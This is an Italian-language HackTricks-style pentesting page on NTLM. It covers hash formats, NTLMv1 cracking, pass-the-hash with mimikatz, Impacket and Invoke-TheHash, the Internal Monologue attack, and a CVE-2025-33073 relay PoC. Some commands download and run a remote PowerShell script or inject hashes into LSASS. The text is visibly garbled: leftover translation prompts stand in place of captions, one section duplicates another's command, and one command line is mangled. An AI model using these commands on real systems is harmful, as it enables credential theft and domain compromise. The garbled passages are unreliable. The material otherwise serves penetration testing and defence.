# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Informazioni di base

Negli ambienti in cui sono in esecuzione **Windows XP e Server 2003**, vengono utilizzati gli hash LM (Lan Manager), anche se è ampiamente riconosciuto che questi possono essere compromessi facilmente. Uno specifico hash LM, `AAD3B435B51404EEAAD3B435B51404EE`, indica uno scenario in cui LM non viene utilizzato, rappresentando l'hash di una stringa vuota.

Per impostazione predefinita, il protocollo di autenticazione **Kerberos** è il metodo principale utilizzato. NTLM (NT LAN Manager) interviene in circostanze specifiche: assenza di Active Directory, inesistenza del dominio, malfunzionamento di Kerberos dovuto a una configurazione errata o quando si tenta di stabilire una connessione utilizzando un indirizzo IP anziché un hostname valido.

La presenza dell'header **"NTLMSSP"** nei pacchetti di rete segnala un processo di autenticazione NTLM.

Il supporto per i protocolli di autenticazione - LM, NTLMv1 e NTLMv2 - è fornito da una DLL specifica situata in `%windir%\Windows\System32\msv1\_0.dll`.

**Punti chiave**:

- Gli hash LM sono vulnerabili e un hash LM vuoto (`AAD3B435B51404EEAAD3B435B51404EE`) indica che non viene utilizzato.
- Kerberos è il metodo di autenticazione predefinito, mentre NTLM viene utilizzato solo in determinate condizioni.
- I pacchetti di autenticazione NTLM sono identificabili dall'header "NTLMSSP".
- I protocolli LM, NTLMv1 e NTLMv2 sono supportati dal file di sistema `msv1\_0.dll`.

## LM, NTLMv1 e NTLMv2

È possibile verificare e configurare quale protocollo verrà utilizzato:

### GUI

Eseguire _secpol.msc_ -> Criteri locali -> Opzioni di sicurezza -> Sicurezza di rete: livello di autenticazione LAN Manager. Sono disponibili 6 livelli (da 0 a 5).

![LM, NTLMv1 e NTLMv2 - GUI: eseguire secpol.msc - Criteri locali - Opzioni di sicurezza - Sicurezza di rete: livello di autenticazione LAN Manager. Sono disponibili 6 livelli (da 0 a 5)](<../../images/image (919).png>)

### Registro di sistema

Questo imposterà il livello 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Valori possibili:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Schema di autenticazione di dominio NTLM di base

1. L'**utente** inserisce le proprie **credenziali**
2. La macchina client **invia una richiesta di autenticazione** inviando il **nome del dominio** e il **nome utente**
3. Il **server** invia la **challenge**
4. Il **client cifra** la **challenge** utilizzando l'hash della password come chiave e la invia come risposta
5. Il **server invia** al **Domain controller** il **nome del dominio, il nome utente, la challenge e la risposta**. Se non **è configurato** un Active Directory o il nome del dominio corrisponde al nome del server, le credenziali vengono **verificate localmente**.
6. Il **Domain controller verifica che sia tutto corretto** e invia le informazioni al server

Il **server** e il **Domain Controller** sono in grado di creare un **Secure Channel** tramite il server **Netlogon**, poiché il Domain Controller conosce la password del server (si trova nel database **NTDS.DIT**).

### Schema di autenticazione NTLM locale

L'autenticazione è come quella menzionata **prima, ma** il **server** conosce l'**hash dell'utente** che tenta di autenticarsi all'interno del file **SAM**. Quindi, invece di chiedere al Domain Controller, il **server verificherà autonomamente** se l'utente può autenticarsi.

### NTLMv1 Challenge

La **lunghezza della challenge è di 8 byte** e la **risposta** è lunga **24 byte**.

L'**hash NT (16 byte)** viene diviso in **3 parti da 7 byte ciascuna** (7B + 7B + (2B+0x00\*5)): l'**ultima parte viene riempita con zeri**. Quindi, la **challenge** viene **cifrata separatamente** con ciascuna parte e i byte **cifrati risultanti** vengono **concatenati**. Totale: 8B + 8B + 8B = 24 byte.

**Problemi**:

- Mancanza di **casualità**
- Le 3 parti possono essere **attaccate separatamente** per trovare l'hash NT
- **DES è crackabile**
- La 3ª chiave è composta sempre da **5 zeri**.
- Data la **stessa challenge**, la **risposta** sarà **la stessa**. Quindi, puoi fornire alla vittima come **challenge** la stringa "**1122334455667788**" e attaccare la risposta utilizzando **rainbow table precalcolate**.

### Attacco NTLMv1

Al giorno d'oggi è sempre meno comune trovare ambienti con Unconstrained Delegation configurato, ma questo non significa che tu non possa **abusare di un servizio Print Spooler** configurato.

Potresti abusare di alcune credenziali/sessioni che già possiedi nell'AD per **chiedere alla stampante di autenticarsi** verso un **host sotto il tuo controllo**. Quindi, utilizzando `metasploit auxiliary/server/capture/smb` o `responder`, puoi **impostare la challenge di autenticazione su 1122334455667788**, acquisire il tentativo di autenticazione e, se è stato eseguito utilizzando **NTLMv1**, potrai **crackarlo**.\
Se utilizzi `responder`, potresti provare a **utilizzare il flag `--lm`** per tentare di **effettuare il downgrade** dell'**autenticazione**.\
_Nota che per questa tecnica l'autenticazione deve essere eseguita utilizzando NTLMv1 (NTLMv2 non è valido)._

Ricorda che la stampante utilizzerà l'account del computer durante l'autenticazione e che gli account dei computer utilizzano **password lunghe e casuali** che **probabilmente non riuscirai a crackare** utilizzando i **dizionari** comuni. Tuttavia, l'autenticazione **NTLMv1** **utilizza DES** ([maggiori informazioni qui](#ntlmv1-challenge)), quindi utilizzando alcuni servizi appositamente dedicati al cracking di DES riuscirai a crackarla (puoi utilizzare ad esempio [https://crack.sh/](https://crack.sh) o [https://ntlmv1.com/](https://ntlmv1.com)).

### Attacco NTLMv1 con hashcat

NTLMv1 può essere violato anche con NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), che formatta i messaggi NTLMv1 in un metodo che può essere violato con hashcat.<sup>[[1]](#references)</sup>

Il comando
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
Per favore, fornisci il testo da tradurre.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the content to put in the file.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Esegui hashcat (la distribuzione è preferibile tramite uno strumento come hashtopolis), poiché altrimenti richiederà diversi giorni.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
In questo caso conosciamo la password, che è password, quindi imbroglieremo per scopi dimostrativi:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Ora dobbiamo usare hashcat-utilities per convertire le chiavi DES crackate in parti dell'hash NTLM:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Incolla il testo dell’ultima parte da tradurre.
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Incolla qui i contenuti da combinare e tradurre.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

La **lunghezza della challenge è di 8 byte** e vengono inviate **2 response**: una è lunga **24 byte** e la lunghezza dell’**altra** è **variabile**.

**La prima response** viene creata cifrando tramite **HMAC_MD5** la **stringa** composta da **client e domain** e utilizzando come **chiave** l’**hash MD4** dell’**NT hash**. Dopodiché, il **risultato** viene utilizzato come **chiave** per cifrare tramite **HMAC_MD5** la **challenge**. A questa viene aggiunta una **client challenge di 8 byte**. Totale: 24 B.

La **seconda response** viene creata utilizzando **diversi valori** (una nuova client challenge, un **timestamp** per evitare i **replay attack**...)

Se hai un **pcap che ha catturato un processo di autenticazione riuscito**, puoi seguire questa guida per ottenere domain, username, challenge e response e provare a crackare la password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)<sup>[[2]](#references)</sup>

## Pass-the-Hash

**Una volta ottenuto l’hash della vittima**, puoi utilizzarlo per **impersonarla**.\
Devi utilizzare un **tool** che **esegua** l’**autenticazione NTLM utilizzando** quell’**hash**, **oppure** puoi creare un nuovo **sessionlogon** e **iniettare** quell’**hash** all’interno di **LSASS**, in modo che, quando viene eseguita un’autenticazione **NTLM**, venga utilizzato **quell’hash**. L’ultima opzione è quella eseguita da mimikatz.

**Ricorda che puoi eseguire attacchi Pass-the-Hash anche utilizzando account computer.**

### **Mimikatz**

**Deve essere eseguito come amministratore**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Questo avvierà un processo appartenente agli utenti che hanno avviato mimikatz, ma internamente in LSASS le credenziali salvate saranno quelle presenti nei parametri di mimikatz. In seguito, puoi accedere alle network resources come se fossi quell'utente (in modo simile al trucco `runas /netonly`, ma senza dover conoscere la password in plain-text).

### Pass-the-Hash da Linux

Puoi ottenere code execution su macchine Windows usando Pass-the-Hash da Linux.\
[**Accedi qui per scoprire come fare.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Strumenti Impacket compilati per Windows

Puoi scaricare[ i binari di impacket per Windows qui](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (In questo caso devi specificare un comando; cmd.exe e powershell.exe non sono validi per ottenere una shell interattiva)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Sono disponibili molti altri binari Impacket...

### Invoke-TheHash

Puoi ottenere gli script powershell qui: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Questa funzione è una **combinazione di tutte le altre**. Puoi passare **diversi host**, **escluderne** alcuni e **selezionare** l'**opzione** che vuoi utilizzare (_SMBExec, WMIExec, SMBClient, SMBEnum_). Se selezioni **SMBExec** o **WMIExec** ma **non** fornisci alcun parametro _**Command**_, verificherà semplicemente se disponi di **permessi sufficienti**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Deve essere eseguito come amministratore**

Questo tool farà la stessa cosa di mimikatz (modificare la memoria di LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Esecuzione remota manuale di Windows con username e password


{{#ref}}
../lateral-movement/
{{#endref}}

## Estrazione delle credenziali da un Host Windows

**Per maggiori informazioni su** [**come ottenere le credenziali da un host Windows, consulta questa pagina**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue attack

The Internal Monologue Attack è una tecnica stealthy di estrazione delle credenziali che consente a un attacker di recuperare gli hash NTLM dalla macchina della vittima **senza interagire direttamente con il processo LSASS**. A differenza di Mimikatz, che legge gli hash direttamente dalla memoria e viene spesso bloccato dalle soluzioni di sicurezza degli endpoint o da Credential Guard, questo attack sfrutta **chiamate locali al pacchetto di autenticazione NTLM (MSV1_0) tramite la Security Support Provider Interface (SSPI)**. L'attacker prima **downgrada le impostazioni NTLM** (ad esempio, LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) per assicurarsi che NetNTLMv1 sia consentito. In seguito impersona token utente esistenti ottenuti dai processi in esecuzione e attiva localmente l'autenticazione NTLM per generare risposte NetNTLMv1 usando una challenge nota.<sup>[[4]](#references)</sup>

Dopo aver catturato queste risposte NetNTLMv1, l'attacker può recuperare rapidamente gli hash NTLM originali usando **rainbow table precalcolate**, consentendo ulteriori attack Pass-the-Hash per il lateral movement. È importante sottolineare che l'Internal Monologue Attack rimane stealthy perché non genera traffico di rete, non inietta codice e non attiva memory dump diretti, rendendolo più difficile da rilevare per i defender rispetto a metodi tradizionali come Mimikatz.

Se NetNTLMv1 non viene accettato, a causa di security policy applicate, l'attacker potrebbe non riuscire a recuperare una risposta NetNTLMv1.

Per gestire questo caso, lo strumento Internal Monologue è stato aggiornato: acquisisce dinamicamente un server token usando `AcceptSecurityContext()` per **catturare comunque risposte NetNTLMv2** se NetNTLMv1 fallisce. Sebbene NetNTLMv2 sia molto più difficile da crackare, apre comunque una possibilità per relay attack o brute-force offline in casi limitati.

Il PoC è disponibile in **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.

## NTLM Relay e Responder

**Leggi qui una guida più dettagliata su come eseguire questi attack:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Analizzare le challenge NTLM da una cattura di rete

**Puoi usare** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM e Kerberos *Reflection* tramite SPN serializzati (CVE-2025-33073)

Windows contiene diverse mitigazioni che tentano di impedire gli attack di *reflection*, nei quali un'autenticazione NTLM (o Kerberos) originata da un host viene ritrasmessa allo **stesso** host per ottenere privilegi SYSTEM.

Microsoft ha interrotto la maggior parte delle chain pubbliche con MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) e con le patch successive; tuttavia, **CVE-2025-33073** dimostra che le protezioni possono ancora essere aggirate sfruttando il modo in cui il **client SMB tronca i Service Principal Names (SPN)** che contengono target-info *marshalled* (serializzate).<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR del bug
1. Un attacker registra un **DNS A-record** la cui label codifica uno SPN marshalled, ad esempio:
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. La vittima viene indotta ad autenticarsi verso quell'hostname (PetitPotam, DFSCoerce, ecc.).
3. Quando il client SMB passa la stringa target `cifs/srv11UWhRCAAAAA…` a `lsasrv!LsapCheckMarshalledTargetInfo`, la chiamata a `CredUnmarshalTargetInfo` **rimuove** il blob serializzato, lasciando **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (o l'equivalente Kerberos) considera quindi il target come *localhost* perché la parte host breve corrisponde al nome del computer (`SRV1`).
5. Di conseguenza, il server imposta `NTLMSSP_NEGOTIATE_LOCAL_CALL` e inietta nel context l'**access-token SYSTEM di LSASS** (per Kerberos viene creata una subsession key contrassegnata come SYSTEM).
6. Ritrasmettendo quell'autenticazione con `ntlmrelayx.py` **o** `krbrelayx.py` si ottengono pieni privilegi SYSTEM sullo stesso host.<sup>[[5]](#references)</sup>

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch e mitigazioni
* La patch KB per **CVE-2025-33073** aggiunge un controllo in `mrxsmb.sys::SmbCeCreateSrvCall` che blocca qualsiasi connessione SMB il cui target contenga informazioni marshallate (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Applicare **SMB signing** per impedire la reflection anche sugli host non sottoposti a patch.
* Monitorare i record DNS simili a `*<base64>...*` e bloccare i vettori di coercion (PetitPotam, DFSCoerce, AuthIP...).

### Idee per il rilevamento
* Catture di rete con `NTLMSSP_NEGOTIATE_LOCAL_CALL` in cui l'IP del client ≠ IP del server.
* Kerberos AP-REQ contenente una subsession key e un principal client uguale al hostname.
* Logon SYSTEM Windows degli eventi 4624/4648 seguiti immediatamente da scritture SMB remote dallo stesso host.<sup>[[5]](#references)</sup>

Per la variante di local reflection del **marzo 2026**, che sfrutta **SMB arbitrary ports** e il **riutilizzo delle connessioni TCP** per ottenere `NT AUTHORITY\SYSTEM`, vedere:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Cracking an NTLMv2 Hash](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
